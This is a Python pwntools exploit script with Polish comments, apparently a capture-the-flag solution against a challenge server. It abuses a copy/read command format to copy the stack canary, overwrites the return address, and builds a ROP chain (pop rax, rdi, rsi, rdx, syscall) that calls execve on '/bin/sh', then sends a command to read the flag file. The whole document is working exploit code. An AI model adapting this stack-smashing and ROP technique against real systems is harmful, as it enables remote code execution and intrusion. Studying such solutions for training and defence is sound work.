from pwn import *

serverAddress = 'mim2022.tailcall.net'
p = remote(serverAddress, 30004)

rax = 0x0000000000449467
rdi = 0x00000000004018c2
rsi = 0x000000000040f38e
rdx = 0x00000000004017cf
syscall = 0x00000000004012d3


# funkcja pomocnicza ustawiajace odpowiednio strukture cmd
def cmd(len, dist):
    return p16(len) + p16(dist)


# funkcja pomocnicza, imitująca wejscie do ifa w forze (czyli do kopiowania)
def _if(len, dist):
    assert dist != 0
    return cmd(len, dist)


# funkcja pomocnicza, imitująca wejscie do elsa w forze (czyli do czytania msg)
def _else(len, msg):
    return cmd(len, 0) + msg


# i wczytanie na buf[1048:1056] = pop rax ; ret
# i wczytujemy na buf[1048:1056] = 59 (wartosc rax do wywolania sys_execve)
pop_rax = _else(8 + 8, p64(rax) + p64(0x3b))

# i wczytanie na buf[1072:1088] = pop rdi ; ret
# gdzie robimy rdi = poczatek buforu, czyli adres wskazujacy na pewne "/bin/sh\0"
pop_rdi = _else(8, p64(rdi)) + _if(8, 8 + 16 + 8 + 8 + 8 + 1024)

# buf[1104:1112] = pop rdx ; ret
# buf[1112:1120] = null [rdx bedzie null]
pop_rdx = _else(8 + 8,  p64(rdx) + p64(0))

# buf[1088:1096] = pop rsi ; ret
# buf[1096:1104] = null [rsi bedzie null]
pop_rsi = _else(8 + 8, p64(rsi) + p64(0))

# buf[1120:1128] = syscall
pop_syscall = _else(8, p64(syscall))

p.send(
    # wczytanie jednego bajtu, aby buf[0] = 1016  -- najwiekszego podzielnego przez 8 < 1024
    _else(1, p8(0xf8)) +
    # skopiowanie 7 najmniej znaczacych bajtow z bufpos (od buf-7 do buf-1)
    # sprawi to, ze buf[0:8] = bufpos z zamienionym najbardziej znaczacym bajtem na 1016
    _if(7, 16) +
    # wczytanie stringa /bin/sh\0 127 = 1016/8 razy, aby dla j > 0: buf[8*j : 8*(j+1)] = /bin/sh\0
    _else(1016, b'/bin/sh\0' * (1016 // 8)) +
    # wczytanie 8 bajtow buf[1024:1032], aby skipnac smieci przed kanarkiem
    _else(8, b'a' * 8) +
    # przepisanie kanarka z miejsca buf[-264]
    _if(8, 1032 + 264) +
    # bufpos = 1032, nadpisujemy SFP i wczytujemy na buf[1040:1048] = 0
    _else(8, p64(0)) +

    # Nadpisujemy teraz return address!!! zaczynamy ROPchain
    # dodanie odpowiedniego rax do ROPchaina
    pop_rax +
    # rdi dodany do ROPchaina
    pop_rdi +
    # rsi dodany do ROPchaina
    pop_rsi +
    # rdx dodany do ROPchaina
    pop_rdx +
    # syscall dodany do ROPchaina
    pop_syscall +
    cmd(0, 0)
)

p.send(b'cat /home/pwn/flag.txt\n')

p.interactive()
